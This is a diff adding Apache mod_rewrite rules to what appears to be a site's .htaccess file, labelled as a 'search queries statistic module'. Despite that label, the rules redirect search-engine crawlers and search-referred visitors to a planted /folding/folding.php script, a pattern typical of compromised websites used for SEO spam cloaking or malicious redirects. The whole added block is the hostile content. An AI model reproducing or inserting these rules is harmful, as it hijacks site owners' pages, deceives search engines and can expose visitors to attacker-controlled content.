@@ -1,0 +1,12 @@
+# Apache search queries statistic module
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteCond %{HTTP_USER_AGENT} (google|yahoo|bing|ask|msn) [OR]
+RewriteCond %{HTTP_REFERER} (google|yahoo|bing|ask|msn)
+RewriteCond %{REQUEST_URI} /$ [OR]
+RewriteCond %{REQUEST_FILENAME} (shtml|html|htm|php|xml|phtml|asp|aspx)$ [NC]
+RewriteCond %{REQUEST_FILENAME} !folding.php
+RewriteCond %{DOCUMENT_ROOT}/folding/folding.php -f
+RewriteRule ^.*$    /folding/folding.php [L]
+</IfModule>
+
